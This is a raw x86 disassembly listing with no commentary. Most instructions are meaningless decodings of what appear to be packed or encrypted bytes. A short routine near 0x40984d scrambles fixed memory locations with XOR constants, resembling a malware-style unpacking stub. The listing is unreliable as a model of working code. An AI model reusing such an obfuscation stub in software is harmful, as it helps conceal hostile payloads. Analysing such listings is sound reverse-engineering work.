  409452:	imul   ebx,DWORD PTR [esi+edi*8],0xffffffb7
  409456:	fisubr WORD PTR [ebx]
  409458:	pop    ebx
  409459:	and    dh,dl
  40945b:	dec    ebx
  40945c:	fist   WORD PTR [eax]
  40945e:	test   DWORD PTR [ebx+0xc80237b],esi
  409464:	inc    esi
  409465:	and    bl,BYTE PTR [ecx]
  409467:	repnz sub DWORD PTR [eax+edx*1+0x7495f00a],esp
  40946f:	std    
  409470:	ja     0x4094d2
  409472:	in     eax,dx
  409473:	sub    eax,0x51b8be28
  409478:	mov    edi,0x71968dec
  40947d:	xchg   edx,eax
  40947e:	cdq    
  40947f:	sbb    BYTE PTR [esi-0x9],bh
  409482:	aaa    
  409483:	or     DWORD PTR [ebp+ecx*2-0x7a],ecx
  409487:	loop   0x4094d7
  409489:	arpl   WORD PTR [ecx+0x62a8618],bx
  40948f:	imul   edx,DWORD PTR [edx-0x6d],0xffffffb0
  409493:	in     al,0xc
  409495:	and    DWORD PTR [edi+ecx*2+0x6401a8c0],esi
  40949c:	ds cwde 
  40949e:	add    eax,0x30cffdce
  4094a3:	xor    eax,0x3657b8ae
  4094a8:	rol    DWORD PTR [ebx-0x363a202c],0x34
  4094af:	ret    0x1735
  4094b2:	xor    BYTE PTR [edi*1+0x3d9a07b3],ah
  4094b9:	adc    BYTE PTR [ebp+0x31],bh
  4094bc:	inc    eax
  4094bd:	cmc    
  4094be:	push   0x723f88ca
  4094c3:	jecxz  0x4094bd
  4094c5:	cli    
  4094c6:	sbb    al,0xa5
  4094c8:	ss jae 0x40950a
  4094cb:	in     eax,0x60
  4094cd:	mov    al,ds:0x4e7b9b9e
  4094d2:	inc    eax
  4094d3:	mov    es,WORD PTR [esi]
  4094d5:	fisttp WORD PTR [eax]
  4094d7:	adc    eax,0x4a7b131f
  4094dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094dd:	cmp    eax,0xa55ba155
  4094e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094e3:	mov    dh,0x8
  4094e5:	outs   dx,DWORD PTR ds:[esi]
  4094e6:	mov    ah,cl
  4094e8:	xchg   esp,eax
  4094e9:	sti    
  4094ea:	add    al,0x4a
  4094ec:	outs   dx,DWORD PTR ds:[esi]
  4094ed:	ja     0x40953f
  4094ef:	dec    edi
  4094f0:	into   
  4094f1:	mov    eax,0x82a604e7
  4094f6:	stos   BYTE PTR es:[edi],al
  4094f7:	pop    edi
  4094f8:	pop    edx
  4094f9:	add    ecx,DWORD PTR [eax-0x18]
  4094fc:	pop    ds
  4094fd:	cwde   
  4094fe:	stos   DWORD PTR es:[edi],eax
  4094ff:	call   0x7200a098
  409504:	push   ebp
  409505:	and    cl,BYTE PTR es:[eax-0x1a]
  409509:	popa   
  40950a:	mov    ch,0xbf
  40950c:	or     BYTE PTR [eax+0x11a9f6a9],dl
  409512:	sub    edx,DWORD PTR [eax+0x11fbc87a]
  409518:	out    0xc5,al
  40951a:	jno    0x4094b5
  40951c:	sub    al,BYTE PTR ds:0x81fe9c7c
  409522:	dec    edx
  409523:	adc    eax,0x16a78134
  409528:	mov    ?,WORD PTR [eax-0x65]
  40952b:	pop    ecx
  40952c:	sub    eax,ebp
  40952e:	test   al,0x50
  409530:	sub    dl,dl
  409532:	jae    0x4094dc
  409534:	out    0x61,eax
  409536:	lods   eax,DWORD PTR ds:[esi]
  409537:	rcl    DWORD PTR ds:0x43f79f92,0x56
  40953e:	lods   eax,DWORD PTR ds:[esi]
  40953f:	add    BYTE PTR ds:0x7a944852,dh
  409545:	push   edi
  409546:	cmp    al,0xd
  409548:	out    dx,al
  409549:	retf   0x8374
  40954c:	test   eax,0x669b289b
  409551:	fwait
  409552:	out    dx,al
  409553:	add    ch,BYTE PTR [ecx+0x5f]
  409556:	lds    esi,FWORD PTR [ecx]
  409558:	mov    bh,0x24
  40955a:	rcl    DWORD PTR [ebx-0x54],1
  40955d:	adc    dl,ch
  40955f:	pop    ebp
  409560:	repz and al,0x22
  409563:	mov    ebp,0x886f7199
  409568:	jl     0x40951d
  40956a:	(bad)
  40956e:	fbstp  TBYTE PTR [esi-0x30291e7a]
  409574:	and    eax,0xad3dce5
  409579:	leave  
  40957a:	push   ecx
  40957b:	popa   
  40957c:	sbb    eax,0x402fec64
  409581:	loope  0x40954b
  409583:	dec    ebx
  409584:	out    dx,al
  409585:	pop    edx
  409586:	inc    edx
  409587:	retf   0x77a7
  40958a:	stos   DWORD PTR es:[edi],eax
  40958b:	cmc    
  40958c:	stos   BYTE PTR es:[edi],al
  40958d:	push   ebx
  40958e:	outs   dx,BYTE PTR ds:[esi]
  40958f:	fld    DWORD PTR [esi]
  409591:	sub    dh,cl
  409593:	aas    
  409594:	jle    0x409604
  409596:	and    al,0x8b
  409598:	test   dh,al
  40959a:	pop    eax
  40959b:	push   cs
  40959c:	xor    eax,0xa91765ea
  4095a1:	cs pop ss
  4095a3:	popa   
  4095a4:	pop    ebp
  4095a5:	add    eax,0x34f8fbe
  4095aa:	int3   
  4095ab:	xchg   edi,eax
  4095ac:	mov    bl,0xd
  4095ae:	nop
  4095af:	push   0xc4ceea92
  4095b4:	and    bl,BYTE PTR [ebx-0x3f711e24]
  4095ba:	mov    dh,0xcd
  4095bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095bd:	idiv   BYTE PTR [edi]
  4095bf:	and    DWORD PTR [ebx+0xc],edi
  4095c2:	and    eax,0xa199537c
  4095c7:	rol    BYTE PTR [ebx],1
  4095c9:	and    eax,DWORD PTR [esi]
  4095cb:	(bad)  
  4095cc:	sbb    dl,BYTE PTR [edx+esi*8+0x4a359896]
  4095d3:	jg     0x4095a1
  4095d5:	and    DWORD PTR [eax],ebp
  4095d7:	pop    ss
  4095d8:	inc    esp
  4095d9:	test   eax,0x572b3cf8
  4095de:	loope  0x4095db
  4095e0:	xchg   edi,eax
  4095e1:	adc    dh,bh
  4095e3:	lds    ecx,FWORD PTR [edx]
  4095e5:	pop    DWORD PTR [esp+ecx*1-0xf]
  4095e9:	repz call 0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ecb:0xfdce9b4e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	xchg   ecx,eax
  40960d:	inc    ebp
  40960e:	inc    esi
  40960f:	xchg   edx,eax
  409610:	xor    ch,0xc6
  409613:	gs (bad) 
  409615:	es push ds
  409617:	into   
  409618:	sub    al,0xdb
  40961a:	std    
  40961b:	xor    ch,BYTE PTR [esi+0x12]
  40961e:	push   eax
  40961f:	inc    esp
  409620:	stc    
  409621:	fwait
  409622:	dec    edi
  409623:	jo     0x4095f2
  409625:	das    
  409626:	adc    BYTE PTR [edx-0x26],bl
  409629:	sti    
  40962a:	sbb    eax,0x8af46c33
  40962f:	arpl   bx,sp
  409631:	loope  0x4095e9
  409633:	adc    dl,bl
  409635:	xchg   ecx,eax
  409636:	pop    edi
  409637:	pop    ebx
  409638:	sahf   
  409639:	sbb    BYTE PTR [edi],dl
  40963b:	inc    edx
  40963c:	out    dx,al
  40963d:	or     DWORD PTR [ebp+0x6c],0x1074fa6
  409644:	arpl   WORD PTR cs:[eax+0x78115997],ax
  40964b:	pop    edi
  40964c:	scas   eax,DWORD PTR es:[edi]
  40964d:	push   ds
  40964e:	jle    0x40966d
  409650:	mov    WORD PTR [edx+0x4641927e],cs
  409656:	retf   0x77f8
  409659:	(bad)  
  40965a:	and    eax,0x735ef20e
  40965f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409660:	sar    BYTE PTR fs:0x2a2b612a,cl
  409667:	into   
  409668:	inc    eax
  409669:	jge    0x409616
  40966b:	idiv   DWORD PTR [eax-0x27b7cdb8]
  409671:	xchg   BYTE PTR [bx+si+0x18b7],dl
  409676:	stos   BYTE PTR es:[edi],al
  409677:	add    eax,0xb52532ff
  40967c:	sti    
  40967d:	std    
  40967e:	aad    0xd4
  409680:	cli    
  409681:	ja     0x40966a
  409683:	ins    BYTE PTR es:[edi],dx
  409684:	xor    al,0x26
  409686:	dec    ebx
  409687:	push   0xffffff99
  409689:	addr16 je 0x409703
  40968c:	add    cl,dh
  40968e:	xchg   esp,eax
  40968f:	xor    eax,DWORD PTR [esi-0x149b9f36]
  409695:	add    dl,0x33
  409698:	cs test ah,bh
  40969b:	sbb    eax,0x6b974300
  4096a0:	push   ebp
  4096a1:	fnstcw WORD PTR [ecx]
  4096a3:	sub    bh,bh
  4096a5:	fisttp QWORD PTR [edi-0x73bfccde]
  4096ab:	mov    bl,BYTE PTR [ebp-0x34]
  4096ae:	and    BYTE PTR [eax-0x5aedf78f],cl
  4096b4:	mov    ecx,0x4e4a71bb
  4096b9:	adc    BYTE PTR [edx+0x2f],dh
  4096bc:	mov    eax,ecx
  4096be:	clc    
  4096bf:	pop    edi
  4096c0:	and    DWORD PTR [eax+0x78c1875c],0xffffffca
  4096c7:	loope  0x409665
  4096c9:	out    0x7,al
  4096cb:	mov    ebp,0xdc7902a8
  4096d0:	jp     0x409716
  4096d2:	test   eax,0x99d86415
  4096d7:	fnstenv [ecx+0x275267bc]
  4096dd:	test   al,0x79
  4096df:	and    DWORD PTR ds:0xf44e0938,ecx
  4096e5:	push   esp
  4096e6:	jbe    0x4096b6
  4096e8:	mov    BYTE PTR [ebx-0x2e],cl
  4096eb:	cdq    
  4096ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ed:	fcomp  QWORD PTR [esi+0x18519e08]
  4096f3:	and    al,0xe6
  4096f5:	(bad)  
  4096f6:	xchg   ebp,eax
  4096f7:	sbb    eax,0xe6ace30
  4096fc:	bound  esi,QWORD PTR [edi]
  4096fe:	gs xchg edi,eax
  409700:	push   eax
  409701:	sahf   
  409702:	pusha  
  409703:	push   0x5fd5a00f
  409708:	inc    edx
  409709:	retf   
  40970a:	aad    0xea
  40970c:	repnz lea eax,ds:0xf161a75a
  409713:	repz test DWORD PTR [edx],ecx
  409716:	(bad)
  40971a:	sahf   
  40971b:	mov    ds:0x14414bbd,eax
  409720:	mov    al,0x64
  409722:	das    
  409723:	or     ecx,eax
  409725:	sub    cl,BYTE PTR [ebx]
  409727:	inc    ebx
  409728:	daa    
  409729:	mul    BYTE PTR [esi-0x55871738]
  40972f:	retf   0x3d6
  409732:	sub    al,BYTE PTR [ebp+0x69]
  409735:	leave  
  409736:	jne    0x4097b7
  409738:	inc    esp
  409739:	and    al,0xa3
  40973b:	jae    0x4097b7
  40973d:	add    DWORD PTR [ebx+0x5d],0xfe295824
  409744:	fisubr WORD PTR [ebx+0x2185abb6]
  40974a:	sub    eax,0xca24077f
  40974f:	fmul   QWORD PTR [edx+edi*8+0x12]
  409753:	push   edx
  409754:	mov    al,ds:0x1905a9f2
  409759:	cld    
  40975a:	jo     0x4097da
  40975c:	push   esi
  40975d:	mov    ebx,0xf78f524b
  409762:	nop
  409763:	leave  
  409764:	cmp    bl,BYTE PTR [eax+0x2978ecda]
  40976a:	add    BYTE PTR [esi],ah
  40976c:	mov    eax,ds:0xc4bd8e85
  409771:	adc    DWORD PTR [eax+0x62d05657],ebx
  409777:	mov    ds:0x69d43b99,eax
  40977c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40977d:	test   al,0xb7
  40977f:	sub    cl,BYTE PTR [esi]
  409781:	add    DWORD PTR [edx+0x4cdb96c4],0x74ca8ded
  40978b:	test   DWORD PTR [ebx],0x76521daf
  409791:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409793:	inc    edx
  409794:	cmp    cl,BYTE PTR [edx]
  409796:	ins    DWORD PTR es:[edi],dx
  409797:	cmp    DWORD PTR ds:0xe1780dbc,edx
  40979d:	mov    esp,0xa4bf9b81
  4097a2:	ja     0x409801
  4097a4:	call   FWORD PTR [edx]
  4097a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097a7:	dec    ebx
  4097a8:	(bad)  
  4097a9:	int3   
  4097aa:	hlt    
  4097ab:	mov    eax,0xd199a612
  4097b0:	loope  0x409782
  4097b2:	scas   eax,DWORD PTR es:[edi]
  4097b3:	int    0x84
  4097b5:	push   ss
  4097b6:	xor    ebx,esp
  4097b8:	test   al,0x56
  4097ba:	out    dx,al
  4097bb:	es int3 
  4097bd:	out    0x7a,eax
  4097bf:	sar    DWORD PTR [eax-0x3ffb6a82],1
  4097c5:	bound  edi,QWORD PTR [eax+0x39]
  4097c8:	aaa    
  4097c9:	cmc    
  4097ca:	pop    eax
  4097cb:	ret    0xf07d
  4097ce:	and    cl,BYTE PTR [ebp+0x28a4d7d1]
  4097d4:	fwait
  4097d5:	cmp    dh,cl
  4097d7:	or     BYTE PTR [eax+0x70],dh
  4097da:	es icebp 
  4097dc:	push   ss
  4097dd:	adc    edx,ecx
  4097df:	ret    0x9673
  4097e2:	xor    bh,cl
  4097e4:	in     eax,0x4b
  4097e6:	jp     0x4097b7
  4097e8:	xchg   edi,eax
  4097e9:	gs add eax,0x6ab3711b
  4097ef:	push   ebx
  4097f0:	xchg   edi,eax
  4097f1:	jns    0x409812
  4097f3:	clc    
  4097f4:	push   ebx
  4097f5:	or     al,0x5d
  4097f7:	ficomp WORD PTR [eax]
  4097f9:	pop    esi
  4097fa:	ret    
  4097fb:	mov    fs,WORD PTR [esi-0x31]
  4097fe:	lahf   
  4097ff:	jbe    0x409783
  409801:	cmp    ch,0xc9
  409804:	jo     0x409798
  409806:	sahf   
  409807:	pushf  
  409808:	retf   0xd389
  40980b:	cmp    bh,BYTE PTR [eax+0x444fbd77]
  409811:	pop    ebx
  409812:	jb     0x4097ba
  409814:	aas    
  409815:	xor    edi,DWORD PTR [esi+0x37]
  409818:	sbb    ecx,DWORD PTR [ebp+0x5]
  40981b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40981c:	sub    edi,esp
  40981e:	div    DWORD PTR [edi]
  409820:	cmp    edi,edx
  409822:	fcomip st,st(6)
  409824:	push   ebp
  409825:	push   edi
  409826:	std    
  409827:	mov    WORD PTR [ecx],cs
  409829:	push   esp
  40982a:	adc    al,0x3a
  40982c:	ins    DWORD PTR es:[edi],dx
  40982d:	(bad)  
  40982e:	xchg   edi,eax
  40982f:	push   es
  409830:	div    BYTE PTR [ebx+0x4e]
  409833:	cmp    eax,0x458ba1a8
  409838:	hlt    
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4337df
  40986f:	xor    DWORD PTR ds:0x433717,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4337db,0x4337ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433767,0x433813
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4336fb
  4098a6:	sub    DWORD PTR ds:0x4337df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	imul   ecx,DWORD PTR [ebx],0xd9b44c9b
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	adc    eax,0xe312d8df
  4098d1:	hlt    
  4098d2:	jbe    0x40988f
  4098d4:	sbb    al,0x83
  4098d6:	pop    ebx
  4098d7:	scas   al,BYTE PTR es:[edi]
  4098d8:	cli    
  4098d9:	add    al,bh
  4098db:	sar    BYTE PTR ds:[ecx+ecx*8+0x298ada09],cl
  4098e3:	mov    esp,DWORD PTR [eax+eiz*4-0x4f87bdd7]
  4098ea:	sti    
  4098eb:	add    BYTE PTR [esi+0x43ce90ea],bl
  4098f1:	ror    DWORD PTR [edi+0x2e214ff9],cl
  4098f7:	sub    eax,0x83b51166
  4098fc:	clc    
  4098fd:	jo     0x40993a
  4098ff:	inc    ebp
  409900:	shr    DWORD PTR [ebx-0x4d],1
  409903:	add    al,0xa4
  409905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409906:	std    
  409907:	inc    edx
  409908:	pop    ebx
  409909:	bound  esp,QWORD PTR [eax+eax*1-0x72d2d86c]
  409910:	sbb    BYTE PTR [ecx],0x32
  409913:	mov    ebp,0x17bbb261
  409918:	je     0x409926
  40991a:	pop    eax
  40991b:	bound  esi,QWORD PTR [eax-0x296dc791]
  409921:	sti    
  409922:	in     al,dx
  409923:	out    dx,al
  409924:	mov    bl,0x90
  409926:	aam    0x77
  409928:	xchg   ebp,eax
  409929:	mov    ss,WORD PTR [edx+0x2324c2a9]
  40992f:	repnz inc esp
  409931:	jg     0x40995d
  409933:	fmulp  st(7),st
  409935:	adc    BYTE PTR [ecx+eiz*4+0x76],0x13
  40993a:	adc    al,0xd4
  40993c:	sub    DWORD PTR [edi-0x1bcd4e83],esi
  409942:	shl    DWORD PTR [edx+edx*2-0x3],1
  409946:	jb     0x409928
  409948:	daa    
  409949:	push   ebp
  40994a:	outs   dx,BYTE PTR ds:[esi]
  40994b:	or     BYTE PTR [esi-0x5e0d7cc6],0xdc
  409952:	xchg   ebx,eax
  409953:	inc    ecx
  409954:	mov    esp,0x8d0d585f
  409959:	jp     0x4099b1
  40995b:	sub    DWORD PTR [esp+esi*1-0x570a137f],ecx
  409962:	shr    DWORD PTR [ebx-0x16cc5209],cl
  409968:	add    esi,DWORD PTR [ecx+ecx*4-0x10d0fc09]
  40996f:	and    BYTE PTR [ecx-0x73f4789b],ah
  409975:	cmp    cl,BYTE PTR [edx]
  409977:	sub    al,0x29
  409979:	mov    al,0xad
  40997b:	mov    WORD PTR [edx+ebx*8],?
  40997e:	mov    edi,0xbdeb8adb
  409983:	in     eax,0xed
  409985:	mov    ds:0x7d14e209,eax
  40998a:	icebp  
  40998b:	test   al,0x44
  40998d:	jbe    0x409918
  40998f:	rol    BYTE PTR [edi+0x2edd7fb7],cl
  409995:	sbb    esi,ebx
  409997:	push   cs
  409998:	out    0xa6,eax
  40999a:	test   al,0x43
  40999c:	popa   
  40999d:	xor    al,0x12
  40999f:	inc    eax
  4099a0:	fwait
  4099a1:	cmp    DWORD PTR [ebp-0x199bbb99],edi
  4099a7:	neg    BYTE PTR [ebx+0x76]
  4099aa:	pop    ss
  4099ab:	mov    ecx,0xb067cc02
  4099b0:	xchg   edi,eax
  4099b1:	xor    esi,ebp
  4099b3:	daa    
  4099b4:	mov    edi,0x794f1dc1
  4099b9:	(bad)  
  4099ba:	sahf   
  4099bb:	mov    edx,0x36ff219f
  4099c0:	jl     0x409a3d
  4099c2:	xchg   ah,bl
  4099c4:	das    
  4099c5:	fstp   TBYTE PTR [ebx+eiz*1+0x58]
  4099c9:	pop    ds
  4099ca:	sub    DWORD PTR [edx+0x477e8d12],esi
  4099d0:	sbb    esp,esp
  4099d2:	jb     0x409972
  4099d4:	cmp    DWORD PTR [ecx+0x2],ecx
  4099d7:	mov    al,0xe
  4099d9:	clc    
  4099da:	dec    edx
  4099db:	imul   esi,DWORD PTR [edx],0x1b056e67
  4099e1:	dec    edi
  4099e2:	push   edx
  4099e3:	scas   eax,DWORD PTR es:[edi]
  4099e4:	(bad)  
  4099e5:	retf   0x4289
  4099e8:	cld    
  4099e9:	inc    esi
  4099ea:	(bad)  
  4099eb:	ss data16 cmp BYTE PTR ss:[eax+0x7f],0xf0
  4099f2:	shl    DWORD PTR ds:0xe75a7cac,1
  4099f8:	push   es
  4099f9:	dec    ebp
  4099fa:	jbe    0x4099f7
  4099fc:	mov    DWORD PTR [esi+ecx*1+0x6e],ecx
  409a00:	call   0x544a:0x496624cf
  409a07:	dec    ebx
  409a08:	adc    bh,BYTE PTR [esp+esi*1+0x38]
  409a0c:	sub    bh,BYTE PTR [ebx+0x48f0ec8]
  409a12:	and    BYTE PTR [ebx+0x39a08e50],bl
  409a18:	retf   
  409a19:	jae    0x4099b6
  409a1b:	das    
  409a1c:	xchg   esp,eax
  409a1d:	aaa    
  409a1e:	push   ss
  409a1f:	push   ebp
  409a20:	xor    al,0x7c
  409a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a23:	in     al,dx
  409a24:	push   eax
  409a25:	das    
  409a26:	xchg   edi,eax
  409a27:	sti    
  409a28:	pop    ecx
  409a29:	mov    ah,0x24
  409a2b:	and    al,0x4a
  409a2d:	push   eax
  409a2e:	shl    DWORD PTR [eax+0x7b],1
  409a31:	sbb    esp,esp
  409a33:	mov    al,ds:0xd5282e25
  409a38:	jb     0x409a01
  409a3a:	aam    0xd
  409a3c:	test   DWORD PTR [edi+0x79],0xbd2c23f6
  409a43:	add    esp,DWORD PTR [esi+0x5d29317a]
  409a49:	jno    0x409aa1
  409a4b:	sbb    eax,0x93deb5d0
  409a50:	(bad)  
  409a51:	cmp    al,0xa5
  409a53:	adc    eax,0x6b043aec
  409a58:	dec    edi
  409a59:	push   esp
  409a5a:	sub    eax,DWORD PTR [edx]
  409a5c:	mov    eax,0x133689c7
  409a61:	mov    esp,0x5d7e5838
  409a66:	cmp    ebp,DWORD PTR [eax-0x6]
  409a69:	add    al,0xab
  409a6b:	xchg   ebp,eax
  409a6c:	jns    0x409ac8
  409a6e:	add    al,0x20
  409a70:	repz mov ah,BYTE PTR [ebp-0x6dc6d88b]
  409a77:	(bad)  
  409a78:	in     eax,dx
  409a79:	mov    ebp,0x34b22c1b
  409a7e:	iret   
  409a7f:	ins    DWORD PTR es:[edi],dx
  409a80:	pusha  
  409a81:	retf   0x300
  409a84:	(bad)  
  409a85:	jge    0x409aea
  409a87:	cmpps  xmm7,xmm1,0x9
  409a8b:	pop    ebx
  409a8c:	dec    ebx
  409a8d:	(bad)  
  409a8e:	(bad)  
  409a8f:	mov    esp,0x4cd37c1
  409a94:	fldenv [ebp-0x54f4c153]
  409a9a:	jbe    0x409aa5
  409a9c:	xor    edx,DWORD PTR [esi+0x42]
  409a9f:	lock das 
  409aa1:	bound  ebp,QWORD PTR [edx+esi*4+0x2d051974]
  409aa8:	repz fld TBYTE PTR ds:[ebp+0x19]
  409aad:	inc    esp
  409aae:	xor    edi,DWORD PTR [esi]
  409ab0:	jecxz  0x409a41
  409ab2:	aas    
  409ab3:	(bad)  
  409ab5:	xor    bh,BYTE PTR [esi+0x5f]
  409ab8:	jl     0x409ae9
  409aba:	nop
  409abb:	data16 mov ds:0x994cebb7,al
  409ac1:	rcl    BYTE PTR es:[ebx],cl
  409ac4:	dec    edi
  409ac5:	out    0xb0,al
  409ac7:	mul    DWORD PTR [ebx+0x624e4064]
  409acd:	mov    DWORD PTR [eax+0x15982232],ebx
  409ad3:	into   
  409ad4:	loopne 0x409b13
  409ad6:	mov    bh,0x9b
  409ad8:	(bad)  
  409ad9:	stc    
  409ada:	mov    esi,0x6d3a781d
  409adf:	call   0xd69d2c11
  409ae4:	retf   0x78de
  409ae7:	mov    ecx,0x9f506db0
  409aec:	fndisi(8087 only) 
  409aee:	mov    dl,0xc6
  409af0:	mov    ?,WORD PTR [ebp-0x34]
  409af3:	int3   
  409af4:	mov    WORD PTR [ebx-0x5e],cs
  409af7:	push   ebp
  409af8:	pusha  
  409af9:	adc    BYTE PTR [ecx+0x2c88ad56],dh
  409aff:	rol    bl,1
  409b01:	in     al,0x14
  409b03:	sub    eax,0xb2588842
  409b08:	sbb    esp,DWORD PTR [esi+0x434893b5]
  409b0e:	xlat   BYTE PTR ds:[ebx]
  409b0f:	fnstsw WORD PTR [edi-0x7ea8a9c7]
  409b15:	sbb    eax,0x43379f
  409b1a:	push   ebx
  409b1b:	aaa    
  409b1c:	inc    ebx
  409b1d:	add    cl,ch
  409b1f:	pop    esi
  409b20:	add    al,BYTE PTR [eax]
  409b22:	add    ch,al
  409b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b25:	lods   al,BYTE PTR ds:[esi]
  409b26:	shr    BYTE PTR [ecx+edx*8+0x61],cl
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x69055cd4]
  409b32:	arpl   WORD PTR [esi-0x1c],di
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	icebp  
  409b3c:	daa    
  409b3d:	pop    ecx
  409b3e:	add    ecx,DWORD PTR [edi+0x46]
  409b41:	cmp    eax,0x74e6ded7
  409b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b47:	jl     0x409b8d
  409b49:	ds in  al,0x73
  409b4c:	call   0xa0e6:0x881c24b6
  409b53:	nop
  409b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b55:	xchg   ebp,eax
  409b56:	push   esp
  409b57:	call   0x1b182b31
  409b5c:	out    0x67,al
  409b5e:	lods   eax,DWORD PTR ds:[esi]
  409b5f:	pop    ebx
  409b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b61:	dec    ebp
  409b62:	inc    ecx
  409b63:	or     eax,0xdebd0e9f
  409b68:	add    al,0x93
  409b6a:	mov    ebp,0xecf34b54
  409b6f:	jge    0x409b6c
  409b71:	(bad)  
  409b72:	xchg   ecx,eax
  409b73:	sub    BYTE PTR [eax],al
  409b75:	cmp    al,0x71
  409b77:	xor    ebp,ebp
  409b79:	add    DWORD PTR [eax+ecx*1-0x24],eax
  409b7d:	mov    ch,0x89
  409b7f:	cli    
  409b80:	pop    esi
  409b81:	cmp    esi,esp
  409b83:	add    al,0x9b
  409b85:	or     BYTE PTR [ebx-0x1fb6168f],ah
  409b8b:	cwde   
  409b8c:	out    dx,eax
  409b8d:	test   al,0xf3
  409b8f:	into   
  409b90:	fimul  DWORD PTR [edx+0x64]
  409b93:	inc    ebx
  409b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b95:	jle    0x409b5c
  409b97:	jp     0x409b9c
  409b99:	mov    ah,0x5e
  409b9b:	add    eax,0xb51b1e6e
  409ba0:	retf   
  409ba1:	popf   
  409ba2:	lock scas eax,DWORD PTR es:[edi]
  409ba4:	push   0xfffffff1
  409ba6:	xchg   esi,eax
  409ba7:	pop    ebx
  409ba8:	repz mov dl,0x56
  409bab:	je     0x409bbf
  409bad:	adc    BYTE PTR [edx+eiz*4],cl
  409bb0:	jns    0x409b48
  409bb2:	fnstcw WORD PTR [edi+0x3ac7107e]
  409bb8:	js     0x409b68
  409bba:	sbb    al,0x44
  409bbc:	inc    ebx
  409bbd:	ja     0x409bd2
  409bbf:	sti    
  409bc0:	xor    bh,BYTE PTR gs:[edx+ebp*8+0x51]
  409bc5:	(bad)  
  409bc6:	jmp    0x409bbc
  409bc8:	dec    esp
  409bc9:	sub    ah,al
  409bcb:	add    BYTE PTR [ecx],0x90
  409bce:	arpl   WORD PTR [eax],di
  409bd0:	pop    eax
  409bd1:	mov    esp,0x7e37b125
  409bd6:	cdq    
  409bd7:	rol    DWORD PTR [edi+0x2d],cl
  409bda:	cmp    dl,BYTE PTR [eax]
  409bdc:	xchg   esi,eax
  409bdd:	(bad)  
  409bde:	pop    ss
  409bdf:	jbe    0x409c25
  409be1:	add    eax,0x20286a2f
  409be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409be7:	js     0x409be6
  409be9:	mov    ebx,0x34c12224
  409bee:	fwait
  409bef:	pop    ds
  409bf0:	in     al,dx
  409bf1:	sahf   
  409bf2:	sbb    al,0xf6
  409bf4:	imul   edx,DWORD PTR [eax],0x3a9c9592
  409bfa:	and    ch,BYTE PTR [ebp+0x3d82f1b4]
  409c00:	cmp    ebx,esi
  409c02:	lods   al,BYTE PTR ds:[esi]
  409c03:	mov    eax,0x16918bf1
  409c08:	pop    eax
  409c09:	jmp    0x49f1c439
  409c0e:	push   ebx
  409c0f:	mov    esi,0x8cb814da
  409c14:	cli    
  409c15:	mov    al,0x96
  409c17:	in     eax,0xf1
  409c19:	mov    esp,0x1a32670f
  409c1e:	jno    0x409c93
  409c20:	cmp    cl,dh
  409c22:	and    ecx,DWORD PTR [eiz*8-0x1bfb5a1f]
  409c29:	(bad)  
  409c2a:	jo     0x409c3d
  409c2c:	outs   dx,DWORD PTR ds:[esi]
  409c2d:	push   edx
  409c2e:	(bad)  
  409c2f:	in     al,0x35
  409c31:	sub    al,0x5
  409c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c34:	mov    eax,ds:0x5c014e70
  409c39:	repz or DWORD PTR [ecx-0x5411077a],eax
  409c40:	xor    eax,0x2c62e3f9
  409c45:	(bad)  
  409c46:	mov    eax,ds:0xcb2f06a0
  409c4b:	add    edx,esi
  409c4d:	mov    ah,0xfb
  409c4f:	jmp    0xde50:0x1e13c0d3
  409c56:	lgs    eax,FWORD PTR ds:0x8ffe08ec
  409c5d:	mov    esi,0xaf5f531b
